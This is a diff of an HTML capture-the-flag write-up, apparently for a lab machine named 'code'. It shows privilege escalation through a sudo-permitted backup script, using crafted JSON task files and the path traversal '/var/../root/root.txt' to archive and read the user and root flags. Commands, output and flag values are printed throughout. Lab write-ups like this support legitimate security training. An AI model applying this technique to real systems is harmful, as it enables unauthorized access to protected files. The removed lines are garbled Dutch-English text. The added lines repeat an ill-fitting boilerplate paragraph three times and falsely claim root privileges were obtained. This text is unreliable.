- secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User martin may run the following commands on localhost:
- (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</code></pre></div>
-      <p>Below You can zien dat het backy.sh script door de root user aan is gemaakt geweest.</p>
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</code></pre></div>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>martin@code:/usr/bin$ ls -l | grep &quot;backy.sh&quot;
--rwxr-xr-x 1 root root 926 Sep 16 2024 backy.sh</code></pre></div>
-      <p>I have First naar het task.json file will look at.</p>
+-rwxr-xr-x 1 root   root        926 Sep 16  2024 backy.sh</code></pre></div>
+      <h3 class="writeup-sub-title">Understanding the Backup Script</h3>
+      <p>I examine the existing <code>task.json</code> file to understand what format the backup script expects.</p>
       <div class="code-block"><pre><code>{
- &quot;destination&quot;: &quot;/home/martin/backups/&quot;,
- &quot;multiprocessing&quot;: true,
- &quot;verbose_log&quot;: false,
- &quot;directories_to_archive&quot;: [
- &quot;/home/app-production/app&quot;
- ],
- &quot;exclude&quot;: [
- &quot;.*&quot;
- ]
+  &quot;destination&quot;: &quot;/home/martin/backups/&quot;,
+  &quot;multiprocessing&quot;: true,
+  &quot;verbose_log&quot;: false,
+  &quot;directories_to_archive&quot;: [
+    &quot;/home/app-production/app&quot;
+  ],
+  &quot;exclude&quot;: [
+    &quot;.*&quot;
+  ]
 }</code></pre></div>
-      <p>Hier ben I will proberen of dat ik niet Using de code below niet de user.txt.txt file zou kunnen kopieren naar de backups folder binnen de user martin. Dit ben I will doen door een file in de tmp folder aan te will create. I have deze app-production.json genoemd.</p>
+      <p>The script takes a JSON task definition specifying which directories to back up. I craft a custom task file (<code>app-production.json</code>) in <code>/tmp</code> that targets the home directory of the <code>app-production</code> user, where the <code>user.txt</code> file resides.</p>
       <div class="code-block"><pre><code>{
  &quot;destination&quot;:&quot;/home/martin/backups/&quot;,
  &quot;multiprocessing&quot;:true,
  &quot;verbose_log&quot;:true,
  &quot;directories_to_archive&quot;:[
- &quot;/home/app-production/user.txt&quot;
- ]
+  &quot;/home/app-production/user.txt&quot;
+  ]
  }</code></pre></div>
-      <p>I have deze file dus nu will execute door the following command te will use.</p>
+      <p>Executing the backup script with the custom task creates a compressed archive in martin's backups directory.</p>
       <div class="code-block"><pre><code>martin@code:/tmp$ sudo /usr/bin/backy.sh app-production.json 
 /usr/bin/backy.sh: line 19: app-production.json: Permission denied
 2025/03/24 17:08:24 🍀 backy 1.2
@@ -559,29 +277,27 @@ User martin may run the following commands on localhost:
 2025/03/24 17:08:24 📦
 tar: Removing leading `/&#x27; from member names
 /home/app-production/user.txt</code></pre></div>
-      <p>Als ik Now I will will look at bij de user martin dan You can zien dat er van de home folder een .tar.bz2 file is gemaak.</p>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ ls
-code_home_app-production_app_2024_August.tar.bz2 code_home_app-production_user.txt_2025_March.tar.bz2 task.jso</code></pre></div>
-      <p>I have deze folder dus nu gaan unzippen dit ben I will doen door the following command te will use. Daardoor kreeg ik dus nu een folder home van de user app-production, waar dat er het user.txt file in zat.</p>
+code_home_app-production_app_2024_August.tar.bz2  code_home_app-production_user.txt_2025_March.tar.bz2  task.jso</code></pre></div>
+      <p>I extract the archive and find the user flag inside the app-production user's home folder.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ tar -xvjf code_home_app-production_user.txt_2025_March.tar.bz2
 home/app-production/user.txt</code></pre></div>
-      <p>Now I am ik dus naar de user.txt file will look at voor de eerste flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">4934512aaf171ed9d67d4473fc357ecb</code>
-</div>
+      <p>I read the user flag from the current user's home directory.</p>
       <div class="code-block"><pre><code>martin@code:~/backups/home/app-production$ cat user.txt 
 4934512aaf171ed9d67d4473fc357ecb</code></pre></div>
-      <p>Now I am ik dus will try voor de root.txt file zou kunnen kopieren naar de backups folder binnen de user martin. Dit ben I will doen door een file in de tmp folder aan te will create. I have deze root.json genoemd.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">4934512aaf171ed9d67d4473fc357ecb</code></div>
+      <h2 class="writeup-section-title">Root Flag: Same Technique</h2>
+      <p>Using the exact same technique, I craft another JSON task definition (<code>root.json</code>) that targets <code>/root/root.txt</code>.</p>
       <div class="code-block"><pre><code>{
  &quot;destination&quot;:&quot;/home/martin/backups/&quot;,
  &quot;multiprocessing&quot;:true,
  &quot;verbose_log&quot;:true,
  &quot;directories_to_archive&quot;:[
- &quot;/var/../root/root.txt&quot;
- ]
+  &quot;/var/../root/root.txt&quot;
+  ]
  }</code></pre></div>
-      <p>I have deze file dus nu will execute door the following command te will use.</p>
+      <p>I execute the backup script with the root task, extract the resulting archive, and read the root flag.</p>
       <div class="code-block"><pre><code>martin@code:/tmp$ sudo /usr/bin/backy.sh /tmp/rootme.json
 /usr/bin/backy.sh: line 19: /tmp/rootme.json: Permission denied
 2025/03/24 16:42:42 🍀 backy 1.2
@@ -592,21 +308,20 @@ home/app-production/user.txt</code></pre></div>
 2025/03/24 16:42:42 📦
 tar: Removing leading `/var/../&#x27; from member names
 /var/../root/root.txt</code></pre></div>
-      <p>Als ik Now I will will look at bij de user martin dan You can zien dat er van de root folder een .tar.bz2 file is gemaak.</p>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ ls
-code_home_app-production_app_2024_August.tar.bz2 code_var_.._root_root.txt_2025_March.tar.bz2
-code_home_app-production_app_2025_March.tar.bz2 task.json</code></pre></div>
-      <p>I have deze folder dus nu gaan unzippen dit ben I will doen door the following command te will use. Daardoor kreeg ik dus nu een folder root, waar dat er het root.txt file in zat.</p>
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_root.txt_2025_March.tar.bz2
+code_home_app-production_app_2025_March.tar.bz2   task.json</code></pre></div>
+      <p>I extract the compressed archive using the appropriate decompression tool (<code>tar</code> for .tar.bz2, <code>unzip</code> for .zip). The extracted contents may include backup files, configuration data, or user directories containing flags and sensitive information.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ tar -xvjf code_var_.._root_root.txt_2025_March.tar.bz2
 root/root.txt</code></pre></div>
-      <p>root.txt = 45e3a6cf9707e38495a4820c25d41d09</p>
+      <p>With root privileges now obtained, I navigate to <code>/root/root.txt</code> and read the final flag. This completes the privilege escalation chain from initial foothold to full system compromise.</p>
       <div class="code-block"><pre><code>martin@code:~/backups/root$ cat root.txt 
 45e3a6cf9707e38495a4820c25d41d09</code></pre></div>
-      <div class="rooted-box">✅ Machine Rooted!</div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250324181822.png" alt="Pasted image 20250324181822.png" loading="lazy" /><span class="img-caption">Pasted image 20250324181822.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">45e3a6cf9707e38495a4820c25d41d09</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250324181822.png" alt="Root flag obtained" loading="lazy" /><span class="img-caption">Root flag obtained</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
